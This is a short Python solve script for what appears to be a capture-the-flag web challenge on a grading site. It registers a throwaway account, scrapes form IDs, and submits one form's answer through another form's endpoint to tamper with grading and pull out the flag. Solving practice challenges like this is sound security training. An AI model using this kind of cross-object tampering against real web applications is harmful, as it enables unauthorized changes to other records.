import requests
import re
from random import randint

URL = 'https://grading.hsc.tf'

r = requests.session()

# Register
uname = ''.join([chr(randint(65, 65+26)) for i in range(10)])
passw = uname
data = {'username': uname, 'password': passw}

html = r.post(f"{URL}/register", data=data).text

# Finding the form ids
pattern = re.compile(r'"/([^"]*)')
fids = [i.group(1).strip() for i in pattern.finditer(html)][:-1]

# finding the question if of first question
html = r.get(f"{URL}/{fids[0]}").text

qid = re.search(r'radio" name="([^"]*)"', html).group(1)

# Sending the request to second form but the id and value for the first form
data = {'ID': qid, 'value': 'Africa is not a country'}

html = r.post(f"{URL}/{fids[1]}", data=data).text

html = r.get(f'{URL}/{fids[0]}').text

# Done
flag = re.search(r'flag{[^}]*}', html).group(0)

print(flag)
